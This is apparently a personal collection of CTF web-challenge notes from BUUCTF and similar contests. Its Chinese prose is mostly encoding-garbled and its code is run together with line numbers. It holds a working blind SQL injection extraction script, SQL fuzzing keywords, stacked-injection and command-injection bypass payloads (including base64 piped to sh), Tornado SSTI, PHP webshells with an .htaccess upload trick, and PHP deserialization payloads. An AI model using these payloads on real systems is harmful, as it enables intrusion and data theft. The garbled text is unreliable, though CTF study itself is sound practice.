123456789101112131415161718192021222324252627import requestsimport timeurl = &quot;http://f0c8caf0-fc27-454e-83bc-a557d1891b94.node3.buuoj.cn/index.php&quot;temp = &#123;&quot;id&quot; : &quot;&quot;&#125;flag = &quot;&quot;for i in range(1,1000): time.sleep(0.06) low = 32 high =128 mid = (low+high)//2 while(low&lt;high): temp[&quot;id&quot;] = &quot;1^&quot; + &quot;(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1&quot; %(i,mid) r = requests.post(url,data=temp) print(low,high,mid,&quot;:&quot;) if &quot;Hello&quot; in r.text: low = mid+1 else: high = mid mid =(low+high)//2 if(mid ==32 or mid ==127): break flag +=chr(mid) print(flag)print(&quot;flag=&quot; ,flag) è¯·çœ‹è¿™ä½å¸ˆå‚…çš„é¢˜è§£sqlå­—å…¸ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960selectfromasciisubstrtablecolumnbyschemawhereextractvalueexpif/()%!@#$^&amp;*-_+=&#x27;&quot;~`\\|,.||&amp;&amp;orderupdatexmllimitAndOr%23 &lt;&gt;regexgroup_concattable_nametable_schemacolumn_namedatabaseimformationunion selectascii(substr())(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())(ascii(substr((select(group_concat(flaaag))from(flag)),%s,1))=%s)where(table_schema=database()) è¡¥å……ï¼šä½¿ç”¨burpè¿›è¡ŒFuzzæµ‹è¯•å®ç°SQLæ³¨å…¥ï¼Œburpçš„Intruderæ¨¡å— [GYCTF2020]Blacklist [å †å æ³¨å…¥] å°è¯•å †å æ³¨å…¥ çˆ†åˆ—å HANDLERæ–¹æ³•å¼•è‡ªå¤§ä½¬ï¼šHANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­æ„é€ ï¼š 11&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# å‚è€ƒæ–‡ç«  Pingå‘½ä»¤å¸¸ç”¨ç®¡é“ç¬¦å‘½ä»¤ 123456789&amp; ï¼ˆæŒ‰ä½ä¸ï¼‰ è¡¨ç¤ºä»»åŠ¡åœ¨åå°æ‰§è¡Œï¼Œå¦‚è¦åœ¨åå°è¿è¡Œredis-server,åˆ™æœ‰ redis-server &amp;&amp;&amp; ï¼ˆé€»è¾‘ä¸ï¼‰è¡¨ç¤ºå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰æ‰§è¡Œåä¸€æ¡å‘½ä»¤ ï¼Œå¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œ å¦‚ echo &#x27;1â€˜ &amp;&amp; echo â€˜2â€™| ï¼ˆæŒ‰ä½æˆ–ï¼‰è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°ï¼Œç›´æ¥æ‰§è¡Œ|åé¢çš„è¯­å¥ï¼Œå¦‚ echo â€˜yesâ€™ | wc -l|| ï¼ˆé€»è¾‘æˆ–ï¼‰è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥ï¼Œå¦‚ cat nofile || echo â€œfailâ€; åˆ†å·è¡¨ç¤ºå‘½ä»¤ä¾æ¬¡æ‰§è¡Œã€‚ 1.è¿‡æ»¤é—®é¢˜ï¼šç©ºæ ¼ 1234567&#123;cat,flag.txt&#125; cat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txtcat&lt;flag.txtcat&lt;&gt;flag.txtkg=$&#x27;\\x20flag.txt&#x27;&amp;&amp;cat$kg(\\x20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼ç»•è¿‡) 1)å˜é‡æ‹¼æ¥å­—ç¬¦ä¸² 1234b=ag.php;a=fl;cat$IFS$9$a$b //ä¸ºä»€ä¹ˆè¦åè¿‡æ¥ï¼ŸflagåŒ¹é…æ—¶ä¸­é—´æœ‰å†…å®¹ä¹Ÿä¼šè¢«åŒ¹é…ã€‚//è¡¨è¾¾å¼ .* å°±æ˜¯å•ä¸ªå­—ç¬¦åŒ¹é…ä»»æ„æ¬¡ï¼Œå³è´ªå©ªåŒ¹é…ã€‚ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸ºä¾‹ï¼ša.*bï¼Œå®ƒå°†ä¼šåŒ¹é…æœ€é•¿çš„ä»¥aå¼€å§‹ï¼Œä»¥bç»“æŸçš„å­—ç¬¦ä¸²ã€‚å¦‚æœç”¨å®ƒæ¥æœç´¢aababçš„è¯ï¼Œå®ƒä¼šåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²aababã€‚è¿™è¢«ç§°ä¸ºè´ªå©ªåŒ¹é… 2)baseç¼–ç ç»•è¿‡base64 ç¼–ç çš„æ–¹å¼æ¥ç»•è¿‡ flag è¿‡æ»¤ 1234567åŠ å¯†å‘½ä»¤echo â€œcat flag.phpâ€ | base64è§£å¯†å‘½ä»¤å¹¶æ‰§è¡Œecho Y2F0IGZsYWcucGhwCg== | base64 -d | shç„¶åç”¨$IFS$9ä»£æ›¿ç©ºæ ¼ã€‚æ„é€ payload ?ip=127.0.0.1;echo$IFS$9Y2F0IGZsYWcucGhwCg==$IFS$9|$IFS$9base64$IFS$9-d$IFS$9|$IFS$9sh 3)å†…è”æ‰§è¡Œlinuxä¸­åå¼•å·ä½œä¸ºå†…è”ä½¿ç”¨ 1cat `ls` nc åœ¨linuxä¸­nc åè¿”å›ç½‘é¡µæºç html tornadoBUUCTF tornadoé¢˜è§£tornadoå­˜åœ¨æ¨¡ç‰ˆSSTIæ³¨å…¥æ¼æ´ï¼Œå°è¯•é€šè¿‡æ­¤æ¼æ´è·å–åˆ°æ‰€éœ€å†…å®¹1.å…ˆè®¿é—®æŠ¥é”™ç½‘é¡µ 1/error?msg=Error 2.é€šè¿‡handler.settingså¯¹è±¡è·å–cookie_secretçš„å€¼ï¼Œå³ï¼šhandleræŒ‡å‘RequestHandlerRequestHandler.settingsæŒ‡å‘self.application.settingsæ‰€ä»¥handler.settingsæœ€ç»ˆæŒ‡å‘RequestHandler.application.settingsæ„é€ å¦‚ä¸‹ï¼š 1/error?msg=&#123;&#123;handler.settings&#125;&#125; 3.md5åªåŠ å¯†äºŒè¿›åˆ¶ï¼Œæ‰€ä»¥å…ˆencode(â€˜utf-8â€™)ç¼–ç ä¸ºäºŒè¿›åˆ¶,å¯¹äºå‡½æ•°hash.digest()è¿”å›æ‘˜è¦ï¼Œä½œä¸ºäºŒè¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼hash.hexdigest()è¿”å›æ‘˜è¦ï¼Œä½œä¸ºåå…­è¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼è¿›è€Œæ ¹æ®é¢˜ç›®å·²çŸ¥ä¿¡æ¯ç¼–å†™è„šæœ¬ï¼Œè·å–payload æ–‡ä»¶ä¸Šä¼ è§£æ³•(1) å¸¦å›¾ç‰‡å¤´çš„phpä¸€å¥è¯æœ¨é©¬ 12GIF89a?&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;v&#x27;]);&lt;/script&gt; (2) å¯è§£æçš„phpåç¼€åï¼šphp3ï¼Œphp4ï¼Œphp5ï¼Œphtï¼Œphtml,phpsæ³¨ï¼šèœåˆ€è¿æ¥æ˜¯è¦ç”¨POSTæ³¨æ„MMIEç±»å‹ä¸ºjpegï¼Œå› ä¸ºåªå…è®¸å›¾ç‰‡ä¸Šä¼ Content-Type: image/jpegç»•è¿‡è¿‡ç¨‹ï¼š1.æ–°å»ºtxtæ–‡ä»¶ç¼–å†™ä¸€å¥è¯æœ¨é©¬ï¼Œåç¼€ä¸ºjpgï¼ˆè¿˜æœ‰gif pngç­‰æ ¼å¼è§†æƒ…å†µè€Œå®šï¼‰æ³¨æ„MMIEç±»å‹ä¸ºjpegï¼Œå› ä¸ºåªå…è®¸å›¾ç‰‡ä¸Šä¼ Content-Type: image/jpeg2.BurpsuiteæŠ“åŒ…æ”¹åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åç¼€åï¼Œç›´è‡³ä¸Šä¼ æˆåŠŸï¼Œå¦‚BUUCTF uploadä¸­åªæœ‰phpåç¼€åä¸ºphtmlæ‰å¯ä»¥3.ä¸Šä¼ æˆåŠŸåç”¨èšå‰‘è¿æ¥æœ€ç»ˆåœ¨æ ¹ç›®å½•å¯æ‰¾åˆ°flag [MRCTF]ä½ ä¼ ä½ ğŸå‘¢1.htaccessæ–‡ä»¶ 1234567.htaccessæ–‡ä»¶(æˆ–è€…&quot;åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶&quot;ï¼‰æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚æ¦‚è¿°æ¥è¯´ï¼Œhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸&#x2F;é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚å¯ç”¨.htaccessï¼Œéœ€è¦ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼Œå¹¶å¯ä»¥ç”¨AllowOverrideé™åˆ¶ç‰¹å®šå‘½ä»¤çš„ä½¿ç”¨ã€‚å¦‚æœéœ€è¦ä½¿ç”¨.htaccessä»¥å¤–çš„å…¶ä»–æ–‡ä»¶åï¼Œå¯ä»¥ç”¨AccessFileNameæŒ‡ä»¤æ¥æ”¹å˜ã€‚ä¾‹å¦‚ï¼Œéœ€è¦ä½¿ç”¨.config ï¼Œåˆ™å¯ä»¥åœ¨æœåŠ¡å™¨é…ç½®æ–‡ä»¶ä¸­æŒ‰ä»¥ä¸‹æ–¹æ³•é…ç½®ï¼šAccessFileName .config ã€‚ç¬¼ç»Ÿåœ°è¯´ï¼Œ.htaccesså¯ä»¥å¸®æˆ‘ä»¬å®ç°åŒ…æ‹¬ï¼šæ–‡ä»¶å¤¹å¯†ç ä¿æŠ¤ã€ç”¨æˆ·è‡ªåŠ¨é‡å®šå‘ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€æ”¹å˜ä½ çš„æ–‡ä»¶æ‰©å±•åã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€åªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶ç­‰ä¸€äº›åŠŸèƒ½ã€‚ 2.ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œæ³¨æ„æ–‡ä»¶åå¿…é¡»ç›¸åŒæ‰èƒ½å¤Ÿè¢«ä¸Šä¼ æˆåŠŸ 123&lt;FilesMatch &quot;webshell.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 3.ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬webshell.jpg 123&lt;?php@eval($_POST[&#x27;v&#x27;]);?&gt; 4.ç”¨èšå‰‘è¿æ¥è·å¾—flag HTTPè¯·æ±‚å¤´Referer:http://xxxxxä¿®æ”¹è®¿é—®æµè§ˆå™¨ï¼šåœ¨User-Agentä¸­ä¿®æ”¹åœ¨æœ¬åœ°è®¿é—®ï¼šX-Forwarded-For:127.0.0.1 PHPåºåˆ—åŒ–å’Œååºåˆ—åŒ–1234ï¼ˆ2021.3.24ï¼‰æœ€è¿‘åšåˆ°phpåºåˆ—åŒ–çš„é¢˜çœ‹äº†å¥½å¤šå¸ˆå‚…ä»¬çš„åšå®¢å­¦åˆ°äº†å¾ˆå¤šY4å¸ˆå‚…åšå®¢ï¼šhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;solitudi&#x2F;article&#x2F;details&#x2F;113588692?spm&#x3D;1001.2014.3001.5502è¿™é‡Œå°±æ‰“ç®—ç®€å•æ€»ç»“ä¸€ä¸‹ï¼Œä»¥å¤‡ä¹‹åå¤ä¹  1.protected ,private,publicå±æ€§var å’Œ public å£°æ˜çš„å­—æ®µéƒ½æ˜¯å…¬å…±å­—æ®µï¼Œå› æ­¤å®ƒä»¬çš„å­—æ®µåçš„åºåˆ—åŒ–æ ¼å¼æ˜¯ç›¸åŒçš„ã€‚å…¬å…±å­—æ®µçš„å­—æ®µåæŒ‰ç…§å£°æ˜æ—¶çš„å­—æ®µåè¿›è¡Œåºåˆ—åŒ–ï¼Œä½†åºåˆ—åŒ–åçš„å­—æ®µåä¸­ä¸åŒ…æ‹¬å£°æ˜æ—¶çš„å˜é‡å‰ç¼€ç¬¦å· $ã€‚ protected å£°æ˜çš„å­—æ®µä¸ºä¿æŠ¤å­—æ®µï¼Œåœ¨æ‰€å£°æ˜çš„ç±»å’Œè¯¥ç±»çš„å­ç±»ä¸­å¯è§ï¼Œä½†åœ¨è¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­ä¸å¯è§ã€‚å› æ­¤ä¿æŠ¤å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š \\0*\\0 çš„å‰ç¼€ï¼Œæ³¨æ„ï¼Œè¿™é‡Œçš„ \\0 è¡¨ç¤º ASCII ç ä¸º 0 çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç»è¿‡ urlencode åçœ‹åˆ°çš„ %00 ã€‚ private å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œå­—æ®µåå‰é¢ä¼šåŠ ä¸Š \\0\\0 çš„å‰ç¼€ï¼Œè¿™é‡Œ è¡¨ç¤ºçš„æ˜¯å£°æ˜è¯¥ç§æœ‰å­—æ®µçš„ç±»çš„ç±»åï¼Œè€Œä¸æ˜¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»åã€‚å› ä¸ºå£°æ˜è¯¥ç§æœ‰å­—æ®µçš„ç±»ä¸ä¸€å®šæ˜¯è¢«åºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»ï¼Œè€Œæœ‰å¯èƒ½æ˜¯å®ƒçš„ç¥–å…ˆç±»ã€‚åœ¨è¿›è¡Œé•¿åº¦è®¡ç®—çš„æ—¶å€™ï¼Œä¼šæŠŠ \\0 ä¹Ÿè®¡ç®—ä¸Š 1234567891011121314151617181920212223242526272829 å†åºåˆ—åŒ–å†…å®¹ä¸­ç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œæ­¤æ—¶å­—ç¬¦ä¸²å°±æ”¯æŒåé¢çš„å­—ç¬¦ä¸²ç”¨16è¿›åˆ¶è¡¨ç¤º- ### buu NiZhuanSiWeié¢˜ç›®ç»™å‡ºæºç ï¼š&#96;&#96;&#96;javascript&lt;?php $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;&#x2F;&#x2F;file_get_contents()å‡½æ•°çš„åŠŸèƒ½æ˜¯è¯»å–æ–‡ä»¶å†…å®¹åˆ°ä¸€ä¸ªå­—ç¬¦ä¸² echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;; if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); &#x2F;&#x2F;useless.php $password &#x3D; unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 1.ä½¿ç”¨dataä¼ªåè®®å’Œæ–‡ä»¶åŒ…å«ï¼š 1?text=data:text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php ç”¨php://inputä¼ªåè®®åœ¨ä»¥POSTå½¢å¼ä¼ å…¥â€œ welcome to the zjctf â€œ ä¹Ÿå¯ä»¥ç”¨dataä¼ªåè®®ä¼ å‚ 123456789101112131415161718/?text=php://input&amp;file=php://filter/read=convert.base64-encode/resource=useless.php````2.å¾—åˆ°base64ç¼–ç çš„é¡µé¢ï¼Œè§£å¯†å¦‚ä¸‹ï¼š```java&lt;?php class Flag&#123; //flag.php ï¼ˆé¢˜ç›®æºç æ³¨é‡Šï¼‰ public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); //è¾“å‡ºæ–‡ä»¶å†…å®¹,é€šè¿‡è¿™ä¸ªå‡½æ•°è¯»å–flag echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 3.ååºåˆ—åŒ–ï¼š4.é‡æ–°æ„é€ payload 1?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 5.æœ€åæŸ¥çœ‹æºç å¾—åˆ°flag BUUCTF [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz çŸ¥è¯†ç‚¹ï¼šphpååºåˆ—åŒ–æ¼æ´ï¼Œå¼±ç±»å‹æ¯”è¾ƒ æ‰“å¼€åœ°å€çœ‹åˆ°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; éœ€è¦ç»•è¿‡ä¸¤ä¸ªåœ°æ–¹ 1.ç»•è¿‡is_valid(),protectedå±æ€§æ–¹æ³•ï¼šç”¨å¤§å†™Sè¡¨ç¤ºå­—ç¬¦ä¸²ï¼Œåœ¨php7.1+çš„ç¯å¢ƒä¸‹å¯¹å±æ€§çš„è¦æ±‚ä¸æ˜¯å¾ˆæ•æ„Ÿ,ç”¨publicå±æ€§ç»•è¿‡privateå±æ€§äº§ç”Ÿçš„%00é—®é¢˜ 2.å¼±ç±»å‹ç»•è¿‡__destruct()é­”æœ¯æ–¹æ³•ä¸­ï¼Œop===â€2â€æ˜¯å¼ºæ¯”è¾ƒï¼ˆç±»å‹å’Œå±æ€§éƒ½ç­‰äºâ€™2â€™ï¼‰ï¼Œè€Œprocess()ä½¿ç”¨çš„æ˜¯å¼±æ¯”è¾ƒop==â€2â€ï¼Œå¯ä»¥é€šè¿‡å¼±ç±»å‹ç»•è¿‡æ–¹æ³•ï¼šop=2ï¼Œè¿™æ—¶op===â€2â€ä¸ºfalse,op==â€2â€ä¸ºtrue 1234567private function read() &#123; $res &#x3D; &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res &#x3D; file_get_contents($this-&gt;filename); &#125; return $res; &#125; å¯¹äºfile_get_contents()å‡½æ•°ï¼Œå¯ä»¥ç”¨php:filterä¼ªåè®®è¯»å–ï¼Œå°†filenameç½®ä¸º```php://filter/read=convert.base64-encode/resource=flag.php``ã€‚ 123456789&lt;?phpclass FileHandler &#123; public $op = 2; public $filename = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;//æˆ–è€…ç›´æ¥è¯»&#x27;flag.php&#x27; public $content;&#125;echo serialize(new FileHandler);?&gt;//O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; payloadä¸º 1?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; å¾—åˆ°flag{12ffa359-defc-4dc6-b363-0b6f48c79b91} SSRF 1.ä»‹ç»SSRF å‚è€ƒæ–‡ç«  SSRFç®€ä»‹ SSRFï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰ï¼Œæ˜¯æ”»å‡»è€…è®©æœåŠ¡ç«¯å‘èµ·æ„é€ çš„æŒ‡å®šè¯·æ±‚é“¾æ¥é€ æˆçš„æ¼æ´ã€‚ ç”±äºå­˜åœ¨é˜²ç«å¢™çš„é˜²æŠ¤ï¼Œå¯¼è‡´æ”»å‡»è€…æ— æ³•ç›´æ¥å…¥ä¾µå†…ç½‘ï¼›è¿™æ—¶æ”»å‡»è€…å¯ä»¥ä»¥æœåŠ¡å™¨ä¸ºè·³æ¿å‘èµ·ä¸€äº›ç½‘ç»œè¯·æ±‚ï¼Œä»è€Œæ”»å‡»å†…ç½‘çš„åº”ç”¨åŠè·å–å†…ç½‘æ•°æ®ã€‚ SSRFå½¢æˆåŸå›  å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶å®ƒæœåŠ¡å™¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œæ¯”å¦‚ä½¿ç”¨æˆ·ä»æŒ‡å®šçš„URL webåº”ç”¨è·å–å›¾ç‰‡ã€ä¸‹è½½æ–‡ä»¶ã€è¯»å–æ–‡ä»¶å†…å®¹ç­‰ã€‚ä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘é€è¯·æ±‚ï¼Œå¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®ã€‚ æœ€å¸¸è§çš„ä¾‹å­ï¼šæ”»å‡»è€…ä¼ å…¥ä¸€ä¸ªæœªç»éªŒè¯çš„URLï¼Œåç«¯ä»£ç ç›´æ¥è¯·æ±‚è¿™ä¸ªURLï¼Œå°±ä¼šé€ æˆSSRFæ¼æ´ã€‚ SSRFä¸CSRFçš„åŒºåˆ« CSRFæ˜¯æœåŠ¡å™¨ç«¯æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤çš„æ•°æ®è¿›è¡Œéšæœºå€¼æ ¡éªŒï¼Œä¸”å¯¹httpè¯·æ±‚åŒ…å†…çš„referå­—æ®µæ ¡éªŒä¸ä¸¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç”¨æˆ·çš„cookieä¿¡æ¯ä¼ªé€ ç”¨æˆ·è¯·æ±‚å‘é€è‡³æœåŠ¡å™¨ï¼› SSRFæ˜¯æœåŠ¡å™¨å¯¹ç”¨æˆ·æä¾›çš„å¯æ§URLè¿‡äºä¿¡ä»»ï¼Œæ²¡æœ‰å¯¹æ”»å‡»è€…æä¾›çš„URLè¿›è¡Œåœ°å€é™åˆ¶å’Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä»¥æ­¤ä¸ºè·³æ¿æ”»å‡»å†…ç½‘æˆ–è€…å…¶å®ƒæœåŠ¡å™¨ã€‚ SSRFçš„ç±»å‹ 1ï¼‰æ˜¾ç¤ºå¯¹æ”»å‡»è€…çš„å“åº”ï¼ˆbasicï¼‰ï¼šåœ¨æœåŠ¡å™¨è·å–æ”»å‡»è€…è¦æ±‚çš„URLåï¼ŒæŠŠå“åº”å‘é€å›æ”»å‡»è€…ã€‚ 2ï¼‰ä¸æ˜¾ç¤ºå“åº”ï¼ˆblindï¼‰ï¼šåœ¨æœåŠ¡å™¨è·å–æ”»å‡»è€…è¦æ±‚çš„URLåï¼Œä¸ä¼šæŠŠå“åº”å†…å®¹å‘é€ç»™æ”»å‡»è€…ï¼Œéœ€è¦é€šè¿‡æŠ“åŒ…æˆ–æŸ¥çœ‹æœåŠ¡å™¨æ—¥å¿—åˆ¤æ–­æ˜¯å¦å­˜åœ¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´ã€‚ åˆ©ç”¨SSRFå¯ä»¥å®ç°çš„æ”»å‡» 1ï¼‰è·å–webåº”ç”¨å¯è¾¾æœåŠ¡å™¨çš„bannerä¿¡æ¯ï¼ˆå¦‚è½¯ä»¶å¼€å‘å•†ã€è½¯ä»¶åç§°ç­‰ï¼‰ï¼Œä»¥åŠæ”¶é›†å†…ç½‘webåº”ç”¨çš„æŒ‡çº¹è¯†åˆ«ï¼ˆå¦‚å¼€æ”¾çš„ç«¯å£ã€ä¸­é—´ä»¶ç‰ˆæœ¬ç­‰ï¼‰ï¼Œæ ¹æ®è¿™äº›ä¿¡æ¯å†è¿›è¡Œè¿›ä¸€æ­¥çš„æ¸—é€ï¼› 2ï¼‰æ”»å‡»è¿è¡Œåœ¨å†…ç½‘çš„ç³»ç»Ÿæˆ–åº”ç”¨ç¨‹åºï¼Œè·å–å†…ç½‘ç³»ç»Ÿå¼±å£ä»¤è¿›è¡Œå†…ç½‘æ¼«æ¸¸ï¼Œå¯¹æœ‰æ¼æ´çš„å†…ç½‘webåº”ç”¨å®æ–½æ”»å‡»è·å–webshellï¼ˆå¦‚Struts2å‘½ä»¤æ‰§è¡Œï¼Œdiscuz!è®ºå›SSRFé€šè¿‡Rediså®æ–½getshellç­‰ï¼‰ï¼› 